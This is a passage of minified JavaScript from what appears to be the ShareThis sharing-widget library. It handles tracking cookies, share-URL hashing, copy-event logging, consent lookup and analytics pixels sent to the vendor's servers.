a},checkCookiesEnabled:function(){if(!tpcCookiesEnableCheckingDone){stlib.cookie.setTempCookie("STPC","yes",1);if(stlib.cookie.getCookie("STPC")=="yes"){tpcCookiesEnabledStatus=true}else{tpcCookiesEnabledStatus=false}tpcCookiesEnableCheckingDone=true;return tpcCookiesEnabledStatus}else{return tpcCookiesEnabledStatus}},hasLocalStorage:function(){try{localStorage.setItem("stStorage","yes");localStorage.removeItem("stStorage");return true}catch(a){return false}}};stlib.fpc={cookieName:"__unam",cookieValue:"",createFpc:function(){stlib.fpc.setOptout();if(!document.domain||document.domain.search(/\.gov/)>0){return false}var i=stlib.cookie.getFpcCookie(stlib.fpc.cookieName);if(i==false){var d=Math.round(Math.random()*2147483647);d=d.toString(16);var g=(new Date()).getTime();g=g.toString(16);var f=window.location.hostname.split(/\./)[1];if(!f){return false}var h="";h=stlib.fpc.determineHash(f)+"-"+g+"-"+d+"-1";i=h}else{var b=i;var a=b.split(/\-/);if(a.length==4){var e=Number(a[3]);e++;i=a[0]+"-"+a[1]+"-"+a[2]+"-"+e}}stlib.cookie.setFpcCookie(stlib.fpc.cookieName,i);stlib.fpc.cookieValue=i;return i},setOptout:function(){opt_out=(stlib.cookie.getCookie("st_optout"));stlib.data.set("st_optout",opt_out,"pageInfo")},determineHash:function(b){var f=0;var e=0;for(var d=b.length-1;d>=0;d--){var a=parseInt(b.charCodeAt(d));f=((f<<8)&268435455)+a+(a<<12);if((e=f&161119850)!=0){f=(f^(e>>20))}}return f.toString(16)}};stlib.validate={regexes:{notEncoded:/(%[^0-7])|(%[0-7][^0-9a-f])|["{}\[\]\<\>\\\^`\|]/gi,tooEncoded:/%25([0-7][0-9a-f])/gi,publisher:/^(([a-z]{2}(-|\.))|)[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i,url:/^(http|https):\/\/([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*)/i,fpc:/^[0-9a-f]{7}-[0-9a-f]{11}-[0-9a-f]{7,8}-[0-9]*$/i,sessionID:/^[0-9]*\.[0-9a-f]*$/i,title:/.*/,description:/.*/,buttonType:/^(chicklet|vcount|hcount|large|custom|button|)$/,comment:/.*/,destination:/.*/,source:/.*/,image:/(^(http|https):\/\/([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*))|^$/i,sourceURL:/^(http|https):\/\/([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*)/i,sharURL:/(^(http|https):\/\/([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*))|^$/i}};stlib.html={encode:function(a){if(stlib.html.startsWith(a,"http")){return String(a).replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}else{return String(a).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}},startsWith:function(a,b){return(a.match("^"+b)==b)}};if(typeof(stlib.data)=="undefined"){stlib.data={bInit:false,publisherKeySet:false,pageInfo:{},shareInfo:{},resetPageData:function(){stlib.data.pageInfo.fpc="ERROR";stlib.data.pageInfo.sessionID="ERROR";stlib.data.pageInfo.hostname="ERROR";stlib.data.pageInfo.location="ERROR";stlib.data.pageInfo.product="widget";stlib.data.pageInfo.stid=""},resetShareData:function(){stlib.data.shareInfo={};stlib.data.shareInfo.url="ERROR";stlib.data.shareInfo.sharURL="";stlib.data.shareInfo.buttonType="ERROR";stlib.data.shareInfo.destination="ERROR";stlib.data.shareInfo.source="ERROR"},resetData:function(){stlib.data.resetPageData();stlib.data.resetShareData()},validate:function(){var a=stlib.validate.regexes;function b(f,h){if(h!=encodeURIComponent(h)){a.notEncoded.test(h)?_$de(f+" not encoded"):null;a.tooEncoded.test(h)?_$de(f+" has too much encoding"):null}var g=a[f]?a[f].test(decodeURIComponent(h)):true;if(!g){_$de(f+" failed validation")}}var d=stlib.data.pageInfo;var e;for(e in d){b(e,d[e])}d=stlib.data.shareInfo;for(e in d){b(e,d[e])}},init:function(){if(!stlib.data.bInit){stlib.data.bInit=true;stlib.data.resetData();if(stlib.publisher){stlib.data.setPublisher(stlib.publisher)}stlib.data.set("product",stlib.product,"pageInfo");var h=document.location.href,d="",a="",g=[],k="",j="",e="",b="",f="",i="";g=stlib.data.getRefDataFromUrl(h);if(g.length>0){d=(typeof(g[0])!="undefined")?g[0]:"";a=(typeof(g[1])!="undefined")?g[1]:"";j=stlib.data.removeRefDataFromUrl(h);stlib.data.showModifiedUrl(j);stlib.data.set("url",j,"shareInfo")}else{k=document.referrer;g=k.replace("http://","").replace("https://","").split("/");d=g.shift();a=g.join("/");stlib.data.set("url",h,"shareInfo")}stlib.data.set("title",document.title,"shareInfo");if(stlib.data.publisherKeySet!=true){stlib.data.set("publisher","ur.00000000-0000-0000-0000-000000000000","pageInfo")}stlib.fpc.createFpc();stlib.data.set("fpc",stlib.fpc.cookieValue,"pageInfo");f=(new Date()).getTime().toString();i=Number(Math.random().toPrecision(5).toString().substr(2)).toString();stlib.data.set("sessionID",f+"."+i,"pageInfo");stlib.data.set("hostname",document.location.hostname,"pageInfo");stlib.data.set("location",document.location.pathname,"pageInfo");stlib.data.set("refDomain",d,"pageInfo");stlib.data.set("refQuery",a,"pageInfo")}},showModifiedUrl:function(b){if(window.history&&history.replaceState){history.replaceState(null,document.title,b)}else{if((/MSIE/).test(navigator.userAgent)){var g=0,d=window.location.hash,a=new RegExp("(&st_refDomain=?)[^&|]+"),f=new RegExp("(#st_refDomain=?)[^&|]+"),e=document.location.href;if(a.test(e)){g=d.indexOf("&st_refDomain");window.location.hash=d.substr(0,g)}else{if(f.test(e)){window.location.replace("#")}}}else{document.location.replace(b)}}},getRefDataFromUrl:function(b){var e=new RegExp("st_refDomain="),f="",d="",a=[];if(e.test(b)){f=b.match(/(st_refDomain=?)[^\&|]+/g);a.push(f[0].split("=")[1]);d=b.match(/(st_refQuery=?)[^\&|]+/g);a.push(d[0].replace("st_refQuery=",""))}return a},removeRefDataFromUrl:function(b){var f="",d="",a=new RegExp("(&st_refDomain=?)[^&|]+"),e=new RegExp("(#st_refDomain=?)[^&|]+");if(a.test(b)){f=b.replace(/\&st_refDomain=(.*)/g,"")}else{if(e.test(b)){f=b.replace(/\#st_refDomain=(.*)/g,"")}else{f=b}}return f},setPublisher:function(a){stlib.data.set("publisher",a,"pageInfo");stlib.data.publisherKeySet=true},setSource:function(d,a){var b="";if(a){if(a.toolbar){b="toolbar"+d}else{if(a.page&&a.page!="home"&&a.page!=""){b="chicklet"+d}else{b="button"+d}}}else{b=d}stlib.data.set("source",b,"shareInfo")},set:function(a,d,b){if(typeof(d)=="number"||typeof(d)=="boolean"){stlib.data[b][a]=d}else{if(typeof(d)=="undefined"||d==null){}else{stlib.data[b][a]=encodeURIComponent(decodeURIComponent(unescape(d.replace(/<[^<>]*>/gi," ")).replace(/%/gi,"%25")));if(a=="url"||a=="location"||a=="image"){try{stlib.data[b][a]=encodeURIComponent(decodeURIComponent(decodeURI(d.replace(/<[^<>]*>/gi," ")).replace(/%/gi,"%25")))}catch(f){stlib.data[b][a]=encodeURIComponent(decodeURIComponent(unescape(d.replace(/<[^<>]*>/gi," ")).replace(/%/gi,"%25")))}}}}},get:function(a,b){try{if(stlib.data[b]&&stlib.data[b][a]){return decodeURIComponent(stlib.data[b][a])}else{return false}}catch(d){return false}},unset:function(a,b){if(stlib.data[b]&&typeof(stlib.data[b][a])!="undefined"){delete stlib.data[b][a]}},bindEvent:function(d,a,b){if(d.addEventListener){d.addEventListener(a,b,false)}else{if(d.attachEvent){d.attachEvent("on"+a,b)}}},debug:function(j,g){stlib.data.init();var f=stlib.data.pageInfo;var k="";var d;for(d in f){k+=d+"="+f[d]+"&"}k=k.substring(0,k.length-1);var i="https://l.sharethis.com/";i+=j;i+="?event="+g;i+="&"+k;var h=new Image(1,1);h.src=i;h.onload=function(){return}},parseCookie:function(a,b){b="; "+b;var d=b.split("; "+a+"=");if(d.length===2){return d.pop().split(";").shift()}else{return null}},setConsent:function(b){for(var a in b){stlib.data.set(a,b[a],"pageInfo")}},getEUConsent:function(f){var e=stlib.data.parseCookie("euconsent",document.cookie);if(e!==null){stlib.data.setConsent({consentData:e,consentDomain:document.location.hostname});f()}else{var d=document.createElement("iframe");var b="https://c.sharethis.mgr.consensu.org/v1.0/cmp/portal.html";d.setAttribute("src",b);d.setAttribute("id","st_gdpr_iframe");d.style.width="0px";d.style.height="0px";d.style.position="absolute";d.style.left="-5000px";var a=setInterval(function(){if(document.body!=null){clearInterval(a);document.body.appendChild(d)}},10);stlib.data.bindEvent(window,"message",function(h){var g=/^(http|https):\/\/c.sharethis.mgr.consensu.org/;if(g.test(h.origin)&&h.data.domain==="sharethis.mgr.consensu.org"&&h.data.event==="EU_CONSENT_COOKIE"){var i=h.data.value;if(i!=null&&i!==""){stlib.data.setConsent({consentData:i,consentDomain:".consensu.org"})}f()}})}}};stlib.data.resetData()}stlib.comscore={load:function(){var b=document.referrer;var d="https://sb.scorecardresearch.com/";d+="b?c1=7&c2=8097938&rn="+Math.round(Math.random()*2147483647)+"&c7="+encodeURIComponent(document.location.href)+"&c3=8097938&c8="+encodeURIComponent(document.title)+((b)?"&c9="+encodeURIComponent(document.referrer):"")+"&cv=2.2&cs=js";var a=new Image(1,1);a.src=d;a.onload=function(){return}}};stlib.hash={doNotHash:false,hashAddressBar:false,doNotCopy:false,prefix:"sthash",shareHash:"",incomingHash:"",validChars:["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"],servicePreferences:{linkedin:"param",stumbleupon:"param",bebo:"param"},hashDestination:function(b){if(b=="copy"){return"dpuf"}var d=b.substring(0,2)+b.substring(b.length-2,b.length);var a=function(e,f){if(e.charCodeAt(f)==122){return"a"}return String.fromCharCode(e.charCodeAt(f)+1)};return a(d,0)+a(d,1)+a(d,2)+a(d,3)},getHash:function(){var d=false;var b="";var e=document.location.href;e=e.split("#").shift();var a=e.split("?");if(a.length>1){a=a[1].split("&");for(arg in a){try{if(a[arg].substring(0,6)=="sthash"){d=true;b=a[arg]}}catch(f){}}if(d){return b}else{return document.location.hash.substring(1)}}else{return document.location.hash.substring(1)}},stripHash:function(a){var b=a;b=b.split("#");if(b.length>1){return b[1]}else{return""}},clearHash:function(){if(stlib.hash.validateHash(document.location.hash)){var a=document.location.href.split("#").shift();if(window.history&&history.replaceState){history.replaceState(null,document.title,a)}else{if((/MSIE/).test(navigator.userAgent)){window.location.replace("#")}else{document.location.hash=""}}}},init:function(){var b="";var a=stlib.hash.validChars.length;for(var f=0;f<8;f++){b+=stlib.hash.validChars[Math.random()*a|0]}if(stlib.hash.getHash()==""){stlib.hash.shareHash=stlib.hash.prefix+"."+b}else{var d=stlib.hash.getHash().split(".");var e=d.shift();if(e==stlib.hash.prefix||e==stlib.hash.prefix){stlib.hash.incomingHash=stlib.hash.getHash();stlib.hash.shareHash=stlib.hash.prefix+"."+d.shift()+"."+b}else{stlib.hash.shareHash=stlib.hash.prefix+"."+b}}if(!stlib.hash.doNotHash&&stlib.hash.hashAddressBar){if(document.location.hash==""||stlib.hash.validateHash(document.location.hash)){if(window.history&&history.replaceState){history.replaceState(null,"ShareThis","#"+stlib.hash.shareHash+".dpbs")}else{if((/MSIE/).test(navigator.userAgent)){window.location.replace("#"+stlib.hash.shareHash+".dpbs")}else{document.location.hash=stlib.hash.shareHash+".dpbs"}}}}else{stlib.hash.clearHash()}if(!stlib.hash.doNotHash&&!stlib.hash.doNotCopy){stlib.hash.copyPasteInit()}stlib.hash.copyPasteLog()},checkURL:function(){var b=stlib.data.get("destination","shareInfo");var g=stlib.hash.updateParams(b);var e="."+stlib.hash.hashDestination(b);stlib.hash.updateDestination(e);if(!stlib.hash.doNotHash&&typeof(stlib.data.pageInfo.shareHash)!="undefined"){var d=stlib.data.get("url","shareInfo");var h=stlib.hash.stripHash(d);if(stlib.hash.validateHash(h)||h==""){if(typeof(stlib.hash.servicePreferences[b])!="undefined"){if(stlib.hash.servicePreferences[b]=="param"){_$d1("Don't use hash, use params");_$d2(g);if(g.split("?").length>1){var f=g.split("?")[1].split("&");var i=false;for(var a=0;a<f.length;a++){if(f[a].split(".")[0]=="sthash"){i=true}}if(i){stlib.data.set("url",g,"shareInfo")}else{stlib.data.set("url",g+"&"+stlib.data.pageInfo.shareHash,"shareInfo")}}else{stlib.data.set("url",g+"?"+stlib.data.pageInfo.shareHash,"shareInfo")}if(b=="linkedin"){if(stlib.data.get("sharURL","shareInfo")!=""){stlib.data.set("sharURL",stlib.data.get("url","shareInfo"),"shareInfo")}}}else{_$d1("Using Hash");stlib.data.set("url",g+"#"+stlib.data.pageInfo.shareHash,"shareInfo")}}else{_$d1("Not using custom destination hash type");stlib.data.set("url",g+"#"+stlib.data.pageInfo.shareHash,"shareInfo")}}}},updateParams:function(a){var g=stlib.data.get("url","shareInfo").split("#").shift();var f=/(\?)sthash\.[a-zA-z0-9]{8}\.[a-zA-z0-9]{8}/;var e=/(&)sthash\.[a-zA-z0-9]{8}\.[a-zA-z0-9]{8}/;var d=/(\?)sthash\.[a-zA-z0-9]{8}/;var b=/(&)sthash\.[a-zA-z0-9]{8}/;if(f.test(g)){g=g.replace(f,"?"+stlib.data.pageInfo.shareHash)}else{if(e.test(g)){g=g.replace(e,"&"+stlib.data.pageInfo.shareHash)}else{if(d.test(g)){g=g.replace(d,"?"+stlib.data.pageInfo.shareHash)}else{if(b.test(g)){g=g.replace(b,"&"+stlib.data.pageInfo.shareHash)}}}}return g},updateDestination:function(b){var a=/sthash\.[a-zA-z0-9]{8}\.[a-zA-z0-9]{8}\.[a-z]{4}/;var d=/sthash\.[a-zA-z0-9]{8}\.[a-z]{4}/;_$d_();_$d1("Updating Destination");if(a.test(stlib.data.pageInfo.shareHash)){_$d2(stlib.data.pageInfo.shareHash.substring(0,24));stlib.data.pageInfo.shareHash=stlib.data.pageInfo.shareHash.substring(0,24)+b}else{if(d.test(stlib.data.pageInfo.shareHash)){_$d2(stlib.data.pageInfo.shareHash.substring(0,15));stlib.data.pageInfo.shareHash=stlib.data.pageInfo.shareHash.substring(0,15)+b}else{stlib.data.pageInfo.shareHash+=b}}},validateHash:function(a){var b=/[\?#&]?sthash\.[a-zA-z0-9]{8}\.[a-zA-z0-9]{8}$/;var d=/[\?#&]?sthash\.[a-zA-z0-9]{8}\.[a-zA-z0-9]{8}\.[a-z]{4}$/;var e=/[\?#&]?sthash\.[a-zA-z0-9]{8}\.[a-z]{4}$/;var f=/[\?#&]?sthash\.[a-zA-z0-9]{8}$/;return f.test(a)||e.test(a)||d.test(a)||b.test(a)},appendHash:function(a){var b=stlib.hash.stripHash(a);if(stlib.data.pageInfo.shareHash&&(stlib.hash.validateHash(b)||b=="")){a=a.replace("#"+b,"")+"#"+stlib.data.pageInfo.shareHash}else{}return a},copyPasteInit:function(){var a=document.getElementsByTagName("body")[0];var d=document.createElement("div");d.id="stcpDiv";d.style.position="absolute";d.style.top="-1999px";d.style.left="-1988px";a.appendChild(d);d.innerHTML="ShareThis Copy and Paste";var b=document.location.href.split("#").shift();var e="#"+stlib.hash.shareHash;if(document.addEventListener){a.addEventListener("copy",function(i){if(typeof(Tynt)!="undefined"){return}var h=document.getSelection();if(h.isCollapsed){return}var g=h.getRangeAt(0).cloneContents();d.innerHTML="";d.appendChild(g);if(d.textContent.trim().length==0){return}if((h+"").trim().length==0){}else{if(d.innerHTML==(h+"")||d.textContent==(h+"")){d.innerHTML=stlib.html.encode(stlib.hash.selectionModify(h))}else{d.innerHTML+=stlib.html.encode(stlib.hash.selectionModify(h,true))}}var f=document.createRange();f.selectNodeContents(d);var j=h.getRangeAt(0)},false)}else{if(document.attachEvent){}}},copyPasteLog:function(){var d=window.addEventListener?"addEventListener":"attachEvent";var b=d=="attachEvent"?"oncopy":"copy";var a=document.getElementsByTagName("body")[0];if(a){a[d](b,function(g){var f=true;stlib.data.resetShareData();stlib.data.set("url",document.location.href,"shareInfo");stlib.data.setSource("copy");stlib.data.set("destination","copy","shareInfo");stlib.data.set("buttonType","custom","shareInfo");if(typeof(Tynt)!="undefined"){stlib.data.set("result","tynt","shareInfo");f=false}if(typeof(addthis_config)!="undefined"){stlib.data.set("result","addThis","shareInfo");if(typeof(addthis_config.data_track_textcopy)=="undefined"||addthis_config.data_track_textcopy){stlib.data.set("enabled","true","shareInfo");f=false}else{stlib.data.set("enabled","false","shareInfo")}}},false)}},logCopy:function(a,b){stlib.data.resetShareData();stlib.data.set("url",a,"shareInfo");stlib.data.setSource("copy");stlib.data.set("destination","copy","shareInfo");stlib.data.set("buttonType","custom","shareInfo");if(b){stlib.data.set("description",b,"shareInfo")}stlib.sharer.share()},selectionModify:function(o,m){o=""+o;_$d_();_$d1("Copy Paste");var n=/^((http|https):\/\/([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*))/i;var h=/^([a-z0-9!'\(\)\*\.\-\+:]*(\.)[a-z0-9!'\(\)\*\.\-\+:]*)((\/[a-z0-9!'\(\)\*\.\-\+:]*)*)/i;var f=/^\+?1?[\.\-\\)_\s]?[\\(]?[0-9]{3}[\.\-\\)_\s]?[0-9]{3}[\.\-_\s]?[0-9]{4}$|^[0-9]{3}[\.\-_\s]?[0-9]{4}$/;var j=/^[0-9]{3}[\.\-_\s]?[0-9]{8}$/;var l=/^[0-9]{2}[\.\-_\s]?[0-9]{4}[\.\-_\s]?[0-9]{4}$/;var d=/[\-_\.a-z0-9]+@[\-_\.a-z0-9]+\.[\-_\.a-z0-9]+/i;var g=/[\s@]/;var b=document.location.href.split("#").shift();var i="#"+stlib.hash.shareHash;var a="";var k="";var e=o;if(typeof(m)=="undefined"&&((n.test(o)||h.test(o))&&!g.test(o.trim()))){_$d2("is Url");if(o.match(/#/)==null||stlib.hash.validateHash(o)){k=o.split("#")[0]+i+".dpuf"}else{k=o}}else{_$d2("is Not Url");if(document.location.hash==""||(/^#$/).test(document.location.hash)||stlib.hash.validateHash(document.location.hash)){k=b+i+".dpuf"}else{k=document.location.href}e=o;if(o.length>50){if(!f.test(o)&&!j.test(o)&&!l.test(o)&&!d.test(o)){e+=a}}}if(o.length>140){o=o.substring(0,137)+"..."}stlib.hash.logCopy(k,o);return e}};stlib.pump=function(a,d,e){var b=this;this.isIframeReady=false;this.isIframeSending=false;this.getHash=function(f){var g=f.split("#");g.shift();return g.join("#")};this.broadcastInit=function(f){this.destination=f;_$d_("---------------------");_$d1("Initiating broadcaster:");_$d(this.destination)};this.broadcastSendMessage=function(f){_$d_("---------------------");_$d1("Initiating Send:");if(this.destination===window){if(stlib.browser.ieFallback){window.location.replace(window.location.href.split("#")[0]+"#"+f);_$d2("child can't communicate with parent");return}_$d2("Iframe to publisher: "+f);parent.postMessage("#"+f,document.referrer)}else{_$d2("Publisher to Iframe: "+f);if(stlib.browser.ieFallback){if(this.destination.contentWindow){this.destination.contentWindow.location.replace(this.destination.src+"#"+f);this.isIframeSending=true}return}this.destination.contentWindow.postMessage("#"+f,this.destination.src)}};this.receiverInit=function(h,k){_$d_("---------------------");_$d1("Initiating Receiver:");_$d(h);if(stlib.browser.ieFallback){this.callback=k;this.source=h;if(h===window){window.location.replace(window.location.href.split("#")[0]+"#");this.currentIframe=window.location.hash;var g="receiver"+stlib.functionCount;stlib.functions[g]=function(m){if(""!=window.location.hash&&"#"!=window.location.hash){var l=window.location.hash;m(l);window.location.replace(window.location.href.split("#")[0]+"#")}};stlib.functionCount++;var j="callback"+stlib.functionCount;stlib.functions[j]=k;stlib.functionCount++;setInterval("stlib.functions['"+g+"'](stlib.functions['"+j+"'])",200)}else{}var i=window.addEventListener?"addEventListener":"attachEvent";var f=i=="attachEvent"?"onmessage":"message";window[i](f,function(l){if(h==window){}else{if(l.origin.indexOf("sharethis.com")!=-1){if(l.data.match(/#Pinterest Click/)){stlib.sharer.sharePinterest()}if(l.data.match(/#Print Click/)){stlib.sharer.stPrint()}}}},false);return}var i=window.addEventListener?"addEventListener":"attachEvent";var f=i=="attachEvent"?"onmessage":"message";window[i](f,function(l){if(h==window){_$d1("arrived in iframe from:");_$d(l.origin);if(l.data.match(/#fragmentPump/)||l.data.match(/#Buttons Ready/)||l.data.match(/#Widget Ready/)||l.data.indexOf("#light")==0||l.data.indexOf("#widget")==0||l.data.indexOf("#popup")==0||l.data.indexOf("#show")==0||l.data.indexOf("#init")==0||l.data.indexOf("#test")==0||l.data.indexOf("#data")==0){k(l.data)}}else{if(l.origin.indexOf("sharethis.com")!=-1){_$d1("arrived in parent from:");_$d(l.origin);if(l.data.match(/#fragmentPump/)||l.data.match(/#Buttons Ready/)||l.data.match(/#Widget Ready/)||l.data.indexOf("#light")==0||l.data.indexOf("#widget")==0||l.data.indexOf("#popup")==0||l.data.indexOf("#show")==0||l.data.indexOf("#init")==0||l.data.indexOf("#test")==0||l.data.indexOf("#data")==0){k(l.data)}else{if(l.data.match(/#Pinterest Click/)){stlib.sharer.sharePinterest()}else{if(l.data.match(/#Print Click/)){stlib.sharer.stPrint()}}}}else{_$d1("discarded event from:");_$d(l.origin)}}},false)};this.broadcastInit(a);this.receiverInit(d,e)};stlib.json={c:{"\b":"b","\t":"t","\n":"n","\f":"f","\r":"r",'"':'"',"\\":"\\","/":"/"},d:function(a){return a<10?"0".concat(a):a},e:function(c,f,e){e=eval;delete eval;if(typeof eval==="undefined"){eval=e}f=eval(""+c);eval=e;return f},i:function(d,b,a){return 1*d.substr(b,a)},p:["","000","00","0",""],rc:null,rd:/^[0-9]{4}\-[0-9]{2}\-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}$/,rs:/(\x5c|\x2F|\x22|[\x0c-\x0d]|[\x08-\x0a])/g,rt:/^([0-9]+|[0-9]+[,\.][0-9]{1,3})$/,ru:/([\x00-\x07]|\x0b|[\x0e-\x1f])/g,s:function(a,b){return"\\".concat(stlib.json.c[b])},u:function(a,b){var e=b.charCodeAt(0).toString(16);return"\\u".concat(stlib.json.p[e.length],e)},v:function(b,a){return stlib.json.types[typeof result](result)!==Function&&(a.hasOwnProperty?a.hasOwnProperty(b):a.constructor.prototype[b]!==a[b])},types:{"boolean":function(){return Boolean},"function":function(){return Function},number:function(){return Number},object:function(a){return a instanceof a.constructor?a.constructor:null},string:function(){return String},"undefined":function(){return null}},$$:function(a){function b(f,d){d=f[a];delete f[a];try{stlib.json.e(f)}catch(e){f[a]=d;return 1}}return b(Array)&&b(Object)},encode:function(){var d=arguments.length?arguments[0]:this,a,h;if(d===null){a="null"}else{if(d!==undefined&&(h=stlib.json.types[typeof d](d))){switch(h){case Array:a=[];for(var g=0,e=0,b=d.length;e<b;e++){if(d[e]!==undefined&&(h=stlib.json.encode(d[e]))){a[g++]=h}}a="[".concat(a.join(","),"]");break;case Boolean:a=String(d);break;case Date:a='"'.concat(d.getFullYear(),"-",stlib.json.d(d.getMonth()+1),"-",stlib.json.d(d.getDate()),"T",stlib.json.d(d.getHours()),":",stlib.json.d(d.getMinutes()),":",stlib.json.d(d.getSeconds()),'"');break;case Function:break;case Number:a=isFinite(d)?String(d):"null";break;case String:a='"'.concat(d.replace(stlib.json.rs,stlib.json.s).replace(stlib.json.ru,stlib.json.u),'"');break;default:var g=0,f;a=[];for(f in d){if(d[f]!==undefined&&(h=stlib.json.encode(d[f]))){a[g++]='"'.concat(f.replace(stlib.json.rs,stlib.json.s).replace(stlib.json.ru,stlib.json.u),'":',h)}}a="{".concat(a.join(","),"}");break}}}return a},decode:function(a){if(typeof(a)=="string"){var d=null;try{if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){d=window.JSON&&window.JSON.parse?window.JSON.parse(a):(new Function("return "+a))();return d}else{return null}}catch(b){}}}};try{stlib.json.rc=new RegExp('^("(\\\\.|[^"\\\\\\n\\r])*?"|[,:{}\\[\\]0-9.\\-+Eaeflnr-u \\n\\r\\t])+?$')}catch(z){stlib.json.rc=/^(true|false|null|\[.*\]|\{.*\}|".*"|\d+|\d+\.\d+)$/}stlib.logger={loggerUrl:"https://l.sharethis.com/",l2LoggerUrl:"https://l2.sharethis.com/",productArray:new Array(),version:"",lang:"en",isFpEvent:false,constructParamString:function(){var a=stlib.data.pageInfo;var d="";var b;for(b in a){d+=b+"="+a[b]+"&"}a=stlib.data.shareInfo;for(b in a){d+=b+"="+a[b]+"&"}d+="sop=false";return d},loadPixelsAsync:function(a){if(typeof(stlib.product)!=="undefined"){if((stlib.product=="ecommerce")||(stlib.product=="dos2")||(stlib.product=="feather")||(stlib.product=="simple")||(stlib.product=="simpleshare")||(stlib.product=="simple-share-pro")){return}}if(typeof(a)!=="undefined"){if(a.status==="true"){stlib.data.set("stid",a.stid,"pageInfo");var b="https://ws.sharethis.com/button/p.js";stlib.scriptLoader.loadJavascript(b,function(){})}}},logByImage:function(b,d,e){var a=new Image(1,1);a.src=d+"&img_pview=true";a.onload=function(){return};if(b=="pview"){stlib.logger.loadPixelsAsync(undefined)}else{e?e():null}},log:function(g,f,h,d){if(typeof(stlib.data.get("counter","shareInfo"))!="undefined"){var e=0;if(stlib.data.get("counter","shareInfo")){e=stlib.data.get("counter","shareInfo")}stlib.data.set("ts"+new Date().getTime()+"."+e,"","shareInfo");stlib.data.unset("counter","shareInfo")}else{stlib.data.set("ts"+new Date().getTime(),"","shareInfo")}if(g=="widget"){var b="."+stlib.hash.hashDestination(stlib.data.shareInfo.destination);stlib.hash.updateDestination(b)}if(!f||(f!=stlib.logger.loggerUrl&&f!=stlib.logger.l2LoggerUrl)){f=stlib.logger.loggerUrl}var a=null;if(d){a=g}else{a=(g=="pview")?g:((g=="debug")?"cns":"log")}stlib.data.getEUConsent(function(m){if(g=="pview"){var l=f+a+"?event="+g+"&version="+stlib.logger.version+"&lang="+stlib.logger.lang+"&"+stlib.logger.constructParamString()}else{var l=f+a+"?event="+g+"&"+stlib.logger.constructParamString()}try{var i=new XMLHttpRequest();var j;i.open("GET",l,true);i.withCredentials=true;i.timeout=10000;i.onreadystatechange=function(){if(this.readyState==this.DONE){try{j=JSON.parse(i.responseText);if(g=="pview"){stlib.logger.loadPixelsAsync(j)}else{h?h():null}}catch(n){stlib.data.debug("debug-gdpr","pview_timeout");stlib.logger.logByImage(g,l,h)}}};i.send()}catch(k){stlib.logger.logByImage(g,l,h)}})}};if(typeof(stlib.ajax)=="undefined"){stlib.ajax={post:function(b,e,f,d){var a=new XMLHttpRequest();if(f){d?(a.onreadystatechange=f):null}a.open("POST",b,d);a.send(e);if(f){!d?f():null}},get:function(b,f){try{var a=new XMLHttpRequest();a.open("GET",b,true);a.withCredentials=true;a.onreadystatechange=function(){if(this.readyState==this.HEADERS_RECEIVED){f?f():null}};a.send()}catch(e){var d=new Image(1,1);d.src=b;d.onload=function(){return};f?f():null}}}}stlib.logger.version="buttons.js";var customProduct="widget";if(typeof(stLight)=="undefined"&&typeof(SHARETHIS)=="undefined"){var stWidgetVersion=false;if(typeof(switchTo5x)=="undefined"){stWidgetVersion="4x"}else{if(switchTo5x==false){stWidgetVersion="4x"}if(switchTo5x==true){stWidgetVersion="5xa"}}stLight=new function(){this.version=false;this.publisher=null;this.sessionID_time=(new Date()).getTime().toString();this.sessionID_rand=Number(Math.random().toPrecision(5).toString().substr(2)).toString();this.sessionID=this.sessionID_time+"."+this.sessionID_rand;this.fpc=null;this.counter=0;this.readyRun=false;this.meta={hostname:document.location.host,location:document.location.pathname};this.loadedFromBar=false;this.clickCallBack=false};stLight.loadDefault=function(){if(typeof(customProduct)=="undefined"){this.product="DOS2"}else{this.product=customProduct}this.source="DOS2";this.version="st_insights.js"};stLight.options=function(a){this.loadDefault();if(a&&a.publisher){stLight.setPublisher(a.publisher)}if(a&&a.refDomain){stLight.setRefDomain(a.refDomain)}stlib.logger.productArray=[];if(a&&a.product){stLight.setProduct(a.product)}else{stLight.setProduct(stLight.product)}if(a&&typeof(a.hashAddressBar)!="undefined"){stlib.hash.hashAddressBar=a.hashAddressBar}stlib.hash.doNotHash=stlib.hash.doNotCopy=false;if(a){a.doNotCopy=a.doNotHash=false}stlib.stLightOptionsObj=a};stLight.onReady=function(){if(stLight.readyRun==true){return 